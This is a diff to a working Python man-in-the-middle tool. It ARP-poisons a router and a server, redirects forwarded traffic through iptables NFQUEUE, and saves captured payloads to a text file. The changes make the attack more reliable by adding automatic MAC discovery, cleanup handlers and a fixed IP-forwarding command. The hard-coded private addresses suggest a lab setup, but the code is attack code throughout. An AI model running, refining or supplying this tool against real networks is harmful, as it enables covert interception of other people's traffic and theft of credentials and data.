@@ -10,12 +10,30 @@ import threading
 import time
 from netfilterqueue import NetfilterQueue as nfq
 
-target_ip = ""
-gateway_ip = ""
-gateway_mac = ""
-packet_count= 0
+
+gateway_ip = "198.7.0.1"
+packet_count = 1000
+
+# restoring the rules after CTRL+C interrupt
+def cleanup():
+    print("Cleaning up iptables and disabling IP forwarding...")
+    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 5")
+    os.system("iptables -D INPUT -j NFQUEUE --queue-num 5")
+    os.system("iptables -D INPUT -p tcp --dport 22 -j ACCEPT")
+    os.system("iptables -D FORWARD -p tcp --dport 22 -j ACCEPT")
+    os.system("sysctl -w net.ipv4.ip_forward=0")
+    print("Force quitting..")
+    os._exit(0) # quick exit
+
+# attaching to CTRL+C interrupt
+signal.signal(signal.SIGINT, lambda sig, frame: cleanup())
+signal.signal(signal.SIGTERM, lambda sig, frame: cleanup())
 
 def init():
+    # allow ssh before nfqueue rules
+    os.system("iptables -I INPUT -p tcp --dport 22 -j ACCEPT")
+    os.system("iptables -I FORWARD -p tcp --dport 22 -j ACCEPT")
+
     # turning ip forwarding on
     print("Enabling IP forwarding..")
     os.system("sysctl -w net.ipv4.ip_forward=1")
@@ -27,10 +45,6 @@ def init():
     # ARP = Address Resolution Protocol
     # MAC = Media Access Control
     # ARP Poison parameters
-    global target_ip, gateway_ip, packet_count
-    #target_ip = "172.7.0.2"
-    gateway_ip = "198.7.0.1"
-    packet_count = 1000
 
     # linux network interface for the attack
     # conf.iface = "eth0" # ethernet 0 interface
@@ -47,27 +61,47 @@ def get_mac_address(ip_address):
     # packing the requsest, resulting in a packet that will be sent as broadcast
     arp_request_broadcast = broadcast / arp_request
     
+    print("Sending ARP request...")
     # srp = send and receive packets at layer 2, waiting for responses for 1s
     # returning the first packet
-    response = srp(arp_request_broadcast, timeout=1, verbose = False)[0]
+    response = srp(arp_request_broadcast, timeout=3, verbose = False)[0]
     
-    print(f"MAC address found for ip {ip_address}: {response[0][1].hwsrc}") # printing mac address
+    print(f"Received {len(response)} responses")
+
+    # check for the response
+    if len(response) == 0:
+        return None
+
+    # getting the mac address
+    mac = response[0][1].hwsrc
+
+    print(f"MAC address found for ip {ip_address}: {mac}") # printing mac address
     
-    return response[0][1].hwsrc # returning mac address
+    return mac # returning mac address
 
 def restore_network(gateway_ip, target_ip, target_mac):
     # healing the network
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
+
+    # deleting the rules to restore the iptable
+    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 5")
+    os.system("iptables -D INPUT -j NFQUEUE --queue-num 5")
+    os.system("iptables -D INPUT -p tcp --dport 22 -j ACCEPT")
+    os.system("iptables -D FORWARD -p tcp --dport 22 -j ACCEPT")
+
     print("Disabling IP forwarding..")
-    os.system("sysctl -w net.inet.ip.forwarding=0")
+    os.system("sysctl -w net.ipv4.ip_forward=0")
     # killing the process on a mac
     os.kill(os.getpid(), signal.SIGTERM)
 
 def arp_spoof(target_ip, target_mac, gateway_ip = gateway_ip):
     try:
         if target_mac == "":
-            print("Finding target MAC..")
+            print(f"Finding target MAC for {target_ip}..")
             target_mac = get_mac_address(target_ip)
+            if not target_mac:
+                print(f"MAC not found for {target_ip}!")
+                return
         while True:
             '''
             operation = {1: ARP Request, 2: ARP Reply} 
@@ -87,6 +121,9 @@ def save_packet(packet):
     # converting into string
     packet_data = payload.decode("utf-8", errors="ignore")
     
+    # create folder if it doesnt exist
+    os.makedirs("sniffed_packets", exist_ok=True)
+
     # saving the data
     with open("sniffed_packets/captured_packets.txt", "a") as file:
         file.write(packet_data + "\n")
@@ -98,7 +135,7 @@ def sniff_packet():
     try:
         # capturing packets from target_ip
         print("Packet sniffing started..")
-        queue.bind(5, process_packet)
+        queue.bind(5, save_packet)
         queue.run()
     except KeyboardInterrupt:
         print("Packet sniffing ended..")
@@ -111,15 +148,13 @@ if __name__ == "__main__":
     init()
 
     router_ip = "172.7.0.1"
-    router_mac = "02:42:ac:07:00:01"
     server_ip = "198.7.0.2"
-    server_mac = "02:42:c6:0a:00:03"
 
     # using 2 threads for ARP Poisoning
     poison_router = threading.Thread(target=arp_spoof, 
-                                    args=(router_ip, router_mac))
+                                    args=(router_ip, "", gateway_ip))
     poison_server = threading.Thread(target=arp_spoof, 
-                                    args=(server_ip, ""))
+                                    args=(server_ip, "", gateway_ip))
     
     # sniffing packets in a different thread
     sniffing = threading.Thread(target=sniff_packet)
